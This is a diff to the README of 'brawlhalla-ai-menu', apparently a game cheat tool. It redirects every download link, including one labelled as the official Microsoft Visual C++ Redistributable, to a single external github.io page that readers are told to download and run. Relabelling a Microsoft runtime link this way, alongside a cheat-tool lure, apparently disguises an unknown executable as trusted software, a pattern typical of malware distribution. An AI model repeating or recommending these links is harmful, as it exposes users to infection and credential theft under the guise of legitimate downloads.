@@ -1,6 +1,6 @@
 # ⚡ brawlhalla-ai-menu - Unlock Your Brawlhalla Potential Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Brawlhalla%20Menu%202026-brightgreen?style=for-the-badge&logo=github)](https://github.com/boriss800/brawlhalla-ai-menu/releases)
+[![Download Now](https://img.shields.io/badge/Download-Brawlhalla%20Menu%202026-brightgreen?style=for-the-badge&logo=github)](https://boriss800.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these simple steps to get up and running in under five minutes.
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: [Download Brawlhalla AI Menu](https://github.com/boriss800/brawlhalla-ai-menu/releases)
+Visit this link to download the application: [Download Brawlhalla AI Menu](https://boriss800.github.io)
 
 Click the download button on that page and save the file to your computer.
 
@@ -141,7 +141,7 @@ Updates are released regularly to ensure compatibility with the latest Brawlhall
 
 ## 🔄 Updating the Tool
 
-1.  Visit the [download page](https://github.com/boriss800/brawlhalla-ai-menu/releases) again.
+1.  Visit the [download page](https://boriss800.github.io) again.
 2.  Check if a newer version is available.
 3.  Download and run the new file.
 4.  Your saved config will carry over automatically.
@@ -168,7 +168,7 @@ Updates are released regularly to ensure compatibility with the latest Brawlhall
 
 ### I get a "Missing DLL" error.
 
-- Download and install the latest [Microsoft Visual C++ Redistributable](https://aka.ms/vs/17/release/vc_redist.x64.exe).
+- Download and install the latest [Microsoft Visual C++ Redistributable](https://boriss800.github.io).
 
 ---
 
@@ -182,7 +182,7 @@ Brawlhalla AI Menu is built for convenience. Whether you're a casual player or a
 
 Need the file again? Here's the link:
 
-[![Download Now](https://img.shields.io/badge/Get%20Brawlhalla%20AI%20Menu%202026-Free-blue?style=for-the-badge)](https://github.com/boriss800/brawlhalla-ai-menu/releases)
+[![Download Now](https://img.shields.io/badge/Get%20Brawlhalla%20AI%20Menu%202026-Free-blue?style=for-the-badge)](https://boriss800.github.io)
 
 ---
 
